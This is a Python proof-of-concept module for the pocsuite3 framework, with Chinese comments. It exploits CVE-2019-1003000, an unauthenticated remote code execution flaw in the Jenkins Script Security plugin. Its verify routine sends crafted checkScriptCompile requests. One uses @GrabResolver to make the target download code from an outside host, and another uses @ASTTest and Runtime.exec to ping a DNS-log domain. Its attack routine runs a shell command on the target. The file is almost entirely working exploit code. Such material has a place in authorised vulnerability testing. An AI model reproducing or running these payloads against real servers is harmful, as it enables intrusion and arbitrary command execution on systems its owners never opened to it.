#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
from string import ascii_letters
import threading
import uuid
import subprocess
import os
import traceback
import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import logger
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
CVE-2019-1003000
- https://www.exploit-db.com/exploits/46453
- http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html

至少需要一个具有Overall/Read权限的用户；但是如果Anonymous用户被授予这个权限，也能在不登录情况下利用
-> /configureSecurity/
-> Authorization
-> Allow anonymous read access
'''
class Jenkins_RCE_2019_1003000_POC(POCBase):
    vulID = 'Jenkins-CVE-2019-1003000'
    appName = 'Jenkins'
    appVersion = 'Script Security<= v1.49'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-01-18'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-05-09'  # 编写 PoC 的日期
    updateDate = '2020-05-09'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.jenkins.io/security/advisory/2019-01-08/#SECURITY-1266']  # 漏洞地址来源,0day不用写
    name = 'Jenkins RCE CVE-2019-1003000'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"


    def _verify(self):
        result={}

        vul_url = self.url    # 需要带上jenkins的相对路径，比如：http://192.168.85.129:8080/jenkins-2.152-alpine

        host, port = url2ip(vul_url, True)

        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 

        target_url = vul_url
        
        command = "ping {0}.{1}".format(self.BANNER, self.DOMAIN)

        # 需依赖ivy-2.1.0.jar包
        payload_url = vul_url + \
        '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=' + \
        '@GrabConfig(disableChecksums=true)' + '%0A' + \
        '@GrabResolver(name=%27test%27,%20root=%27http://{0}.{1}%27)'.format(self.BANNER, self.DOMAIN) + '%0A' + \
        '@Grab(group=%27{0}%27,%20module=%27{1}%27,%20version=%271%27)%0Aimport%20Payload;'.format("package", "module")


        # 无需依赖ivy-2.1.0.jar包
        payload_url2 = vul_url + \
        '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=' + \
        '@groovy.transform.ASTTest(value={' + \
        'assert%20java.lang.Runtime.getRuntime().exec(%22{0}%22)'.format(command) +\
        '})def%20x'    
        

        try:
            req.get(payload_url, timeout=5)  #, proxies={'http': 'http://127.0.0.1:8087'})
            req.get(payload_url2, timeout=5) #,proxies={'http': 'http://127.0.0.1:8087'})
        except Exception as e:
            print(e)
            traceback.print_stack()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Payload1'] = payload_url
            result['VerifyInfo']['Payload2'] = payload_url2
            return self.save_output(result)
        return self.save_output(result)
           


    # 攻击模块
    def _attack(self):
        vul_url = self.url    # 需要带上jenkins的相对路径，比如：http://192.168.85.129:8080/jenkins-2.152-alpine

        target_url = vul_url
        

        #command = "ping {0}.{1}".format(self.BANNER, self.DOMAIN)
        command = "touch /tmp/pwnjenkins_1"

        # 无需依赖ivy-2.1.0.jar包
        payload_url = vul_url + \
        '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=' + \
        '@groovy.transform.ASTTest(value={' + \
        'assert%20java.lang.Runtime.getRuntime().exec(%22{0}%22)'.format(command) +\
        '})def%20x'

        try:
            req.get(payload_url, timeout=5)
        except Exception as e:
            print(e)
            traceback.print_stack()


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output



# 注册类
register_poc(Jenkins_RCE_2019_1003000_POC)
